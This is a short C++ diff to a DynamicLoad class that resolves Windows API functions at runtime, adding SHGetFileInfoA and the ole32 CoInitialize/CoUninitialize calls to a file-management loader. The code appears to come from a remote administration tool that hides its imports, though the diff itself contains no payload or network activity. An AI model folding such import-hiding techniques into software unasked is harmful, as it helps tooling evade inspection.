@@ -81,6 +81,7 @@ DynamicLoad::DynamicLoad() {
     if (this->hShell32DLL) {
         this->SHELL32.pShellExecuteExA = (st_Shell32::LPSHELLEXECUTEEXA)wrapGetProcAddr(this->hShell32DLL, "ShellExecuteExA");
         this->SHELL32.pSHGetFolderPathA = (st_Shell32::LPSHGETFOLDERPATHA)wrapGetProcAddr(this->hShell32DLL, "SHGetFolderPathA");
+        this->SHELL32.pSHGetFileInfoA = (st_Shell32::LPSHGETFILEINFOA)wrapGetProcAddr(this->hShell32DLL, "SHGetFileInfoA");
     }
 
     if (this->hWtsapi32DLL) {
@@ -315,6 +316,8 @@ void DynamicLoad::UnloadInfoProcs() {
 
 //Adm archivos
 bool DynamicLoad::LoadFMProcs() {
+    LOAD_DLL(this->hOle32, "ole32.dll");
+
     if (this->hKernel32DLL) {
         this->KERNEL32_FM.pGetLogicalDriveStringsA = (st_Kernel32_FM::LPGETLOGICALDRIVESTRINGSA)wrapGetProcAddr(this->hKernel32DLL, "GetLogicalDriveStringsA");
         this->KERNEL32_FM.pGetVolumeInformationA = (st_Kernel32_FM::LPGETVOLUMEINFORMATIONA)wrapGetProcAddr(this->hKernel32DLL, "GetVolumeInformationA");
@@ -332,6 +335,14 @@ bool DynamicLoad::LoadFMProcs() {
         this->KERNEL32_FM.pRemoveDirectoryA = (st_Kernel32_FM::LPREMOVEDIRECTORYA)wrapGetProcAddr(this->hKernel32DLL, "RemoveDirectoryA");
     }else {
         __DBG_("[X] LoadFMProcs err hKernel32DLL");
+        return false;
+    }
+
+    if (this->hOle32) {
+        this->OLE32.pCoInitialize = (st_Ole32::LPCOINITIALIZE)wrapGetProcAddr(this->hOle32, "CoInitialize");
+        this->OLE32.pCoUninitialize = (st_Ole32::LPCOUNITIALIZE)wrapGetProcAddr(this->hOle32, "CoUninitialize");
+    }else {
+        __DBG_("[X] LoadFMProcs err hOle32");
         return false;
     }
 
